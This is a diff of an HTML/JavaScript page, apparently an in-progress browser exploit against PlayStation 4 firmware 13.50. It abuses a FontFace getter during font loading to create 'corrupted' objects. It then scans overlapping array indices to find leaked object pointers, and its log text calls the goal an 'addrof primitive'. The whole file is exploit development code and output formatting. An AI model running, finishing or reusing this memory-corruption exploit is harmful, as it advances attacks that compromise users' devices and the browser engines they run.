@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 13.50 - Address Variation Test</title>
+<title>PS4 13.50 - Offset Scan</title>
 <style>
     * {
         margin: 0;
@@ -118,20 +118,21 @@
     .warning { color: #ffaa00; }
     .info { color: #00ccff; }
     .highlight { color: #ff00ff; font-weight: bold; }
+    .pattern { color: #666; }
 </style>
 </head>
 <body>
 
 <div class="container">
     <div class="header">
-        <h1>◈ ADDRESS VARIATION TEST ◈</h1>
-        <div class="subtitle">Testing if different objects leak different addresses</div>
+        <h1>◈ OFFSET SCAN ◈</h1>
+        <div class="subtitle">Finding real address at memory offsets</div>
     </div>
     
-    <button class="btn" onclick="runTest()">► RUN TEST</button>
+    <button class="btn" onclick="runTest()">► SCAN OFFSETS</button>
     
     <div class="log-container">
-        <div class="log-header">◈ TEST RESULTS ◈</div>
+        <div class="log-header">◈ SCAN RESULTS ◈</div>
         <div id="log"></div>
     </div>
 </div>
@@ -147,11 +148,12 @@ function log(msg) {
     if (d) {
         d.innerHTML = logBuf.map(line => {
             let className = '';
-            if (line.includes('[+++]')) className = 'success';
+            if (line.includes('[+++]') || line.includes('REAL ADDRESS')) className = 'success';
             else if (line.includes('[ERROR]')) className = 'error';
             else if (line.includes('[!]')) className = 'warning';
-            else if (line.includes('[UNIQUE]')) className = 'highlight';
+            else if (line.includes('[DIFF]')) className = 'highlight';
             else if (line.includes('[+]')) className = 'info';
+            else if (line.includes('pattern')) className = 'pattern';
             
             return `<span class="${className}">${line}</span>`;
         }).join('\n');
@@ -180,21 +182,17 @@ class Int64 {
     toString() {
         return '0x' + this.high.toString(16).padStart(8,'0') + '_' + this.low.toString(16).padStart(8,'0');
     }
-    
-    equals(other) {
-        return this.low === other.low && this.high === other.high;
-    }
 }
 
 function runTest() {
     logBuf = [];
     
     log('═══════════════════════════════════════════════════════');
-    log('       ADDRESS VARIATION TEST - PS4 13.50               ');
+    log('       OFFSET SCAN - FIND REAL ADDRESS                 ');
     log('═══════════════════════════════════════════════════════\n');
     
-    log('[GOAL] Determine if different objects produce different addresses');
-    log('[METHOD] Test multiple objects at multiple indices\n');
+    log('[THEORY] Real address might be at offset from store point');
+    log('[METHOD] Store object at index N, read indices N-5 to N+5\n');
     
     // Setup
     let style = document.createElement('style');
@@ -202,7 +200,6 @@ function runTest() {
     style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
     document.head.appendChild(style);
     
-    // Arrays
     let floatArray = new Float64Array(100);
     let objectArray = new Array(100);
     
@@ -211,7 +208,7 @@ function runTest() {
         objectArray[i] = { id: i };
     }
     
-    log('[SETUP] Arrays created and pre-filled\n');
+    log('[SETUP] Arrays created\n');
     
     let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
     document.fonts.add(A);
@@ -225,7 +222,7 @@ function runTest() {
             if (!fired && this === A) {
                 fired = true;
                 
-                log('[*] Inside getter - triggering corruption\n');
+                log('[*] Inside getter\n');
                 
                 // Create corrupted fonts
                 let corrupted = [];
@@ -241,190 +238,193 @@ function runTest() {
                 
                 log('[CORRUPTION] Active\n');
                 
-                // Required setup (Tests 1-3)
-                log('[SETUP] Running required Tests 1-3...\n');
-                
+                // Required setup
+                log('[SETUP] Tests 1-3...');
                 try {
                     let v1 = corrupted[0];
                     let _ = v1.status;
-                    
                     let v2 = corrupted[1];
                     v2.prop = { x: 1 };
-                    
                     let v3 = corrupted[2];
                     floatArray[50] = v3;
-                    
-                    log('[SETUP] ✓ Tests 1-3 complete\n');
+                    log('[SETUP] ✓ Complete\n');
                 } catch(e) {
-                    log('[SETUP] ! Error: ' + e.message + '\n');
+                    log('[SETUP] ! Error\n');
                 }
                 
                 // ═══════════════════════════════════════════
-                // MAIN TEST: Multiple Objects & Indices
+                // MAIN SCAN: Read surrounding indices
                 // ═══════════════════════════════════════════
                 
                 log('╔════════════════════════════════════════════════╗');
-                log('║      TESTING DIFFERENT OBJECTS                 ║');
+                log('║         SCANNING OFFSETS -10 to +10            ║');
                 log('╚════════════════════════════════════════════════╝\n');
                 
-                let testObjects = [
-                    { name: "obj1", marker: 0x11111111 },
-                    { name: "obj2", marker: 0x22222222 },
-                    { name: "obj3", marker: 0x33333333 },
-                    { name: "obj4", marker: 0x44444444 },
-                    { name: "obj5", marker: 0x55555555 },
-                    new ArrayBuffer(0x100),
-                    new Uint32Array(16),
-                    new Float64Array(16),
-                    [1, 2, 3, 4, 5],
-                    "string_object"
-                ];
+                let targetObj = { 
+                    marker: 0xDEADBEEF, 
+                    test: "TARGET",
+                    id: 9999 
+                };
                 
-                let leakedAddresses = [];
+                let storeIdx = 50;
                 
-                log('[TEST] Leaking ' + testObjects.length + ' different objects:\n');
+                log('[*] Target object: ' + JSON.stringify(targetObj));
+                log('[*] Storing at objectArray[' + storeIdx + ']\n');
                 
-                for (let i = 0; i < testObjects.length; i++) {
+                objectArray[storeIdx] = targetObj;
+                
+                log('[SCAN] Reading floatArray[' + (storeIdx-10) + '] through [' + (storeIdx+10) + ']:\n');
+                
+                let findings = [];
+                
+                for (let offset = -10; offset <= 10; offset++) {
+                    let readIdx = storeIdx + offset;
+                    
+                    if (readIdx < 0 || readIdx >= floatArray.length) continue;
+                    
                     try {
-                        let obj = testObjects[i];
-                        let idx = 50; // Use same index to isolate object variation
+                        let value = floatArray[readIdx];
+                        let addr = Int64.fromDouble(value);
                         
-                        // Store object
-                        objectArray[idx] = obj;
+                        // Calculate expected pattern
+                        let expectedPattern = 1.1 * (readIdx + 1);
+                        let changed = Math.abs(value - expectedPattern) > 0.01;
                         
-                        // Read as float
-                        let leaked = floatArray[idx];
+                        // Build output
+                        let offsetStr = (offset >= 0 ? '+' : '') + offset;
+                        let idxStr = '[' + readIdx + ']';
+                        let addrStr = addr.toString();
                         
-                        if (typeof leaked === 'number') {
-                            let addr = Int64.fromDouble(leaked);
-                            
-                            let objStr = (typeof obj === 'object' && obj !== null && obj.name) 
-                                ? obj.name 
-                                : typeof obj;
-                            
-                            log('[' + String(i).padStart(2, '0') + '] ' + objStr.padEnd(15, ' ') + ' → ' + addr.toString());
-                            
-                            leakedAddresses.push(addr);
+                        let note = '';
+                        
+                        if (!changed) {
+                            note = '(pattern)';
+                        } else {
+                            // Check what changed
+                            if ((addr.high & 0xfff80000) === 0x7ff80000) {
+                                note = '[NaN-boxed]';
+                                findings.push({ offset, addr, type: 'nanbox' });
+                            } else if (addr.high >= 0x01000000) {
+                                note = '[DIFF - high word!]';
+                                findings.push({ offset, addr, type: 'highword' });
+                            } else if (addr.low !== 0) {
+                                note = '[DIFF - low word]';
+                                findings.push({ offset, addr, type: 'lowword' });
+                            } else {
+                                note = '[changed]';
+                            }
                         }
                         
+                        log(offsetStr.padStart(4, ' ') + ' ' + idxStr.padEnd(5, ' ') + ' ' + addrStr + ' ' + note);
+                        
                     } catch(e) {
-                        log('[' + String(i).padStart(2, '0') + '] ERROR: ' + e.message);
+                        log(offset.toString().padStart(4, ' ') + ' ERROR: ' + e.message);
                     }
                 }
                 
                 log('\n');
                 
                 // ═══════════════════════════════════════════
-                // SAME OBJECT, DIFFERENT INDICES
+                // TEST MULTIPLE OBJECTS
                 // ═══════════════════════════════════════════
                 
                 log('╔════════════════════════════════════════════════╗');
-                log('║      TESTING DIFFERENT INDICES                 ║');
+                log('║     TESTING MULTIPLE OBJECTS AT OFFSETS        ║');
                 log('╚════════════════════════════════════════════════╝\n');
                 
-                let singleObj = { test: "same_object", marker: 0xABCDEF };
-                let indicesAddresses = [];
-                
-                let testIndices = [40, 45, 50, 55, 60, 65, 70];
-                
-                log('[TEST] Same object at ' + testIndices.length + ' different indices:\n');
-                
-                for (let i = 0; i < testIndices.length; i++) {
-                    try {
-                        let idx = testIndices[i];
+                if (findings.length > 0) {
+                    log('[*] Found ' + findings.length + ' interesting offsets');
+                    log('[*] Testing with different objects...\n');
+                    
+                    let testObjs = [
+                        { name: "obj1", m: 0x1111 },
+                        { name: "obj2", m: 0x2222 },
+                        { name: "obj3", m: 0x3333 }
+                    ];
+                    
+                    for (let findingIdx = 0; findingIdx < Math.min(3, findings.length); findingIdx++) {
+                        let finding = findings[findingIdx];
                         
-                        objectArray[idx] = singleObj;
-                        let leaked = floatArray[idx];
+                        log('[OFFSET ' + finding.offset + '] Testing with 3 objects:');
                         
-                        if (typeof leaked === 'number') {
+                        for (let objIdx = 0; objIdx < testObjs.length; objIdx++) {
+                            let obj = testObjs[objIdx];
+                            objectArray[storeIdx] = obj;
+                            
+                            let readIdx = storeIdx + finding.offset;
+                            let leaked = floatArray[readIdx];
                             let addr = Int64.fromDouble(leaked);
-                            log('[idx=' + idx + '] ' + addr.toString());
-                            indicesAddresses.push(addr);
+                            
+                            log('  ' + obj.name + ' → ' + addr.toString());
                         }
-                        
-                    } catch(e) {
-                        log('[idx=' + testIndices[i] + '] ERROR: ' + e.message);
+                        log('');
                     }
                 }
-                
-                log('\n');
                 
                 // ═══════════════════════════════════════════
                 // ANALYSIS
                 // ═══════════════════════════════════════════
                 
                 log('╔════════════════════════════════════════════════╗');
-                log('║               ANALYSIS                         ║');
+                log('║              ANALYSIS                          ║');
                 log('╚════════════════════════════════════════════════╝\n');
                 
-                // Check for unique addresses
-                let uniqueAddrs = new Set();
-                leakedAddresses.forEach(addr => {
-                    uniqueAddrs.add(addr.toString());
-                });
+                log('[FINDINGS]');
+                log('  Total changed values: ' + findings.length);
                 
-                log('[DIFFERENT OBJECTS TEST]');
-                log('  Total leaked: ' + leakedAddresses.length);
-                log('  Unique addresses: ' + uniqueAddrs.size);
-                
-                if (uniqueAddrs.size === 1) {
-                    log('  [!] ALL SAME ADDRESS - likely tagged null/metadata');
-                    log('  [!] Not leaking real object pointers');
-                } else if (uniqueAddrs.size === leakedAddresses.length) {
-                    log('  [+++] ALL UNIQUE - real object addresses!');
+                if (findings.length === 0) {
+                    log('  [!] NO VALUES CHANGED from pattern');
+                    log('  [!] Arrays might not be overlapping');
+                    log('  [!] Try refreshing and running again');
                 } else {
-                    log('  [+] SOME VARIATION - ' + uniqueAddrs.size + '/' + leakedAddresses.length + ' unique');
-                }
-                
-                log('\n[DIFFERENT INDICES TEST]');
-                log('  Total leaked: ' + indicesAddresses.length);
-                
-                let allSameIndex = indicesAddresses.length > 0 && 
-                    indicesAddresses.every(addr => addr.equals(indicesAddresses[0]));
-                
-                if (allSameIndex) {
-                    log('  [+++] ALL SAME - consistent address for same object!');
-                } else {
-                    log('  [!] DIFFERENT - index affects leaked value');
-                }
-                
-                log('\n[CONCLUSION]');
-                
-                if (uniqueAddrs.size > 1 && allSameIndex) {
-                    log('  [+++] SUCCESS! Leaking real object addresses!');
-                    log('  [+++] Different objects = different addresses');
-                    log('  [+++] Same object = same address (consistent)');
-                    log('  [+++] addrof primitive is FULLY WORKING!');
-                } else if (uniqueAddrs.size === 1) {
-                    log('  [!] PROBLEM: All addresses are ' + Array.from(uniqueAddrs)[0]);
-                    log('  [!] Likely leaking a constant/tag, not real addresses');
-                    log('  [!] Need to decode differently or find different leak');
-                } else {
-                    log('  [?] MIXED RESULTS - review addresses above');
-                    log('  [?] May need refinement');
+                    log('  Offsets with changes:');
+                    findings.forEach(f => {
+                        log('    ' + (f.offset >= 0 ? '+' : '') + f.offset + ': ' + f.addr.toString() + ' (' + f.type + ')');
+                    });
+                    
+                    log('\n[INTERPRETATION]');
+                    
+                    let hasVaryingAddrs = false;
+                    if (findings.length >= 3) {
+                        // Check if addresses vary per object
+                        log('  Testing if addresses vary per object...');
+                        // This would need the multi-object test results
+                        log('  Review multi-object test above');
+                    }
+                    
+                    let nonNanBox = findings.filter(f => f.type !== 'nanbox');
+                    if (nonNanBox.length > 0) {
+                        log('  [+++] Found non-NaN-boxed values at offsets!');
+                        log('  [+++] These might be real structure members!');
+                        log('  [+++] Possible: butterfly, backing store, etc.');
+                    }
+                    
+                    if (findings.some(f => f.type === 'highword')) {
+                        log('  [+++] Found values with significant high word!');
+                        log('  [+++] These are likely real pointers!');
+                    }
                 }
                 
                 log('\n[!] Returning - OOM will occur');
                 log('═══════════════════════════════════════════════════════\n');
                 
-                window.leakedAddresses = leakedAddresses;
-                window.indicesAddresses = indicesAddresses;
+                window.findings = findings;
             }
             
             return undefined;
         }
     });
     
-    log('[*] Starting test...\n');
+    log('[*] Starting scan...\n');
     document.fonts.load('1em x', 'AB');
 }
 
 log('═══════════════════════════════════════════════════════');
-log('        ADDRESS VARIATION TEST READY                   ');
+log('          OFFSET SCAN READY                            ');
 log('═══════════════════════════════════════════════════════\n');
-log('[INFO] This test will determine if we are leaking');
-log('[INFO] real object addresses or just metadata/tags\n');
-log('[READY] Click RUN TEST\n');
+log('[INFO] This will scan indices around stored object');
+log('[INFO] Looking for real address at offset\n');
+log('[READY] Click SCAN OFFSETS\n');
 
 </script>
 </body>
